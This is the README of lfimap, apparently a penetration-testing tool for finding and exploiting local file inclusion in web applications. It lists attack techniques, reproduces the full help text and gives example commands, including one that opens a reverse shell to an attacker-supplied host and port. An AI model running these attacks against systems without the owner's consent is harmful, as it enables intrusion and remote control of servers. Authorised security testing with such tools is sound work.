# lfimap
## Local file inclusion discovery and exploitation tool

### Main features
- data:// for remote command execution
- expect:// for remote command execution
- input:// for remote command execution
- filter:// for arbitrary file inclusion
- file:// for arbitrary file inclusion
- Remote file inclusion for code execution
- Path truncation for arbitrary file inclusion
- Command injection for remote command execution
- Reflected XSS testing
- Option to test POST arguments
- Option to specify custom http headers
- Option to specify cookies for authenticated requests
- Option to specify a web proxy to send requests through
- Option for automated reverse shell attack upon code execution detection

### Documentation
- [Installation](https://github.com/hansmach1ne/lfimap/wiki/Installation)
- [Usage](https://github.com/hansmach1ne/lfimap/wiki)

### -h, --help
```

usage: lfimap.py [-U [url]] [-F [urlfile]] [-C <cookie>] [-D <request>] [-H <header>] [-P <proxy>] [--useragent <agent>] 
                 [--referer <referer>] [--param <name>] [--no-stop] [-f] [-i] [-d] [-e] [-t] [-r] [-c] [--file] [--xss] 
                 [--info] [-a] [-x] [--lhost <lhost>] [--lport <lport>] [-wT <path>] [-wX <path>] [-wC <path>] [-v] [-h]

lfimap, Local File Inclusion discovery and exploitation tool

MANDATORY:
  -U [url]                       Specify url, Ex: "http://example.org/vuln.php?param=PWN" 
  -F [urlfile]                   Specify url wordlist (every line should have --param|'PWN'.)

GENERAL OPTIONS:
  -C <cookie>                    Specify session cookie, Ex: "PHPSESSID=1943785348b45"
  -D <request>                   Do HTTP POST value test. Ex: "param=PWN"
  -H <header>                    Specify additional HTTP header(s). Ex: "X-Forwarded-For:127.0.0.1"
  -P <proxy>                     Specify Proxy IP address. Ex: "http://127.0.0.1:8080"
  --useragent <agent>            Specify HTTP user agent
  --referer <referer>            Specify HTTP referer
  --param <name>                 Specify different test parameter value
  --no-stop                      Don't stop using same method upon findings

ATTACK TECHNIQUE:
  -f, --filter                   Attack using filter:// wrapper
  -i, --input                    Attack using input:// wrapper
  -d, --data                     Attack using data:// wrapper
  -e, --expect                   Attack using expect:// wrapper
  -t, --trunc                    Attack using path truncation with wordlist (default "short.txt")
  -r, --rfi                      Attack using remote file inclusion
  -c, --cmd                      Attack using command injection
  --file                         Attack using file:// wrapper
  --xss                          Test for reflected XSS
  --info                         Test for basic information disclosures
  -a, --all                      Use all available methods to attack

PAYLOAD OPTIONS:
  -x, --exploit                  Exploit to reverse shell if possible (Setup reverse listener first)
  --lhost <lhost>                Specify local ip address for reverse connection
  --lport <lport>                Specify local port number for reverse connection

WORDLIST OPTIONS:
  -wT <path>                     Specify wordlist for truncation test
  -wX <path>                     Specify wordlist for xss test
  -wC <path>                     Specify wordlist for command injection test

OTHER:
  -v, --verbose                  Print more detailed output when performing attacks
  -h, --help                     Print this help message                   

```
### Examples 

#### 1) All attacks with '-a' (filter, input, data, expect and file wrappers, remote file inclusion, command injection, XSS, error disclosure).
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a`  

![1](https://user-images.githubusercontent.com/57464251/175751020-1528a8a6-acd5-4bb9-933c-31145c06df89.png)


#### 2) Reverse shell command execution attack with '-x'
`python3 lfimap.py -U "http://IP/vuln.php?param=PWN" -C "PHPSESSID=XXXXXXXX" -a --lhost IP --lport PORT -x`  

![2](https://user-images.githubusercontent.com/57464251/175751030-c35ee579-b91e-4e42-85b1-56e97b00d768.png)


#### 3) Post argument testing with '-D'

`python3 lfimap.py -U "http://IP/index.php" -D "page=PWN" -a`

![3](https://user-images.githubusercontent.com/57464251/175751045-8f0faac8-75b1-44ce-a41a-f3f6a4076669.png)


If you notice any issues with the software, please open up an issue. I will gladly take a look at it and try to resolve it. <br>
Pull requests are welcome.

[!] Disclaimer: Lfimap usage for attacking web applications without consent of the application owner is illegal. Developers assume no liability and are 
not responsible for any misuse and damage caused by using this program.
